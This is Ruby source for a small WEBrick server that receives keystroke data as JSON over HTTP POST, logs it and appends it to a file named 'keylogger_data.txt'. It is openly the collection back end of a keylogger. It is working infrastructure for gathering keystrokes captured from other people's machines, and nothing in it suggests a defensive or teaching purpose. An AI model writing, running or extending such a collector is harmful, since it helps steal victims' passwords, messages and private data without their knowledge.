require 'webrick'
require 'json'
require 'logger'

class MyServlet < WEBrick::HTTPServlet::AbstractServlet
  def initialize(server, file_path)
    super(server)
    @logger = Logger.new(STDOUT)
    @logger.level = Logger::INFO
    @file_path = file_path
  end

  def do_POST(request, response)
    begin
      # Read and parse the incoming JSON data
      post_data = request.body
      data = JSON.parse(post_data)
      keyboard_data = data['keyboardData'] || ''

      # Log and save the incoming keystrokes data
      @logger.info("Received data: #{keyboard_data}")
      save_data_to_file(keyboard_data)

      # Respond with a status code 200 (OK)
      response.status = 200
      response.content_type = 'application/json'
      response.body = { 'status' => 'success', 'message' => 'Data received and saved successfully' }.to_json
    rescue JSON::ParserError => e
      # Handle JSON parsing errors
      @logger.error("JSON parsing error: #{e.message}")
      response.status = 400
      response.content_type = 'application/json'
      response.body = { 'status' => 'error', 'message' => 'Invalid JSON' }.to_json
    rescue StandardError => e
      # Handle any other errors
      @logger.error("Server error: #{e.message}")
      response.status = 500
      response.content_type = 'application/json'
      response.body = { 'status' => 'error', 'message' => 'Internal server error' }.to_json
    end
  end

  def save_data_to_file(data)
    File.open(@file_path, 'a') do |file|
      # Split data into lines of up to 30 characters
      data.scan(/.{1,30}/).each do |line|
        file.puts(line)
      end
    end
  end
end

# Define the port, address, and file path for the server
port = 8080
file_path = 'keylogger_data.txt'

# Setup server logging
logger = Logger.new(STDERR)
logger.level = Logger::INFO

server = WEBrick::HTTPServer.new :Port => port, :Logger => logger, :AccessLog => []

server.mount '/', MyServlet, file_path

trap 'INT' do
  logger.info("Shutting down server...")
  server.shutdown
end

puts "Starting server on port #{port}..."
server.start
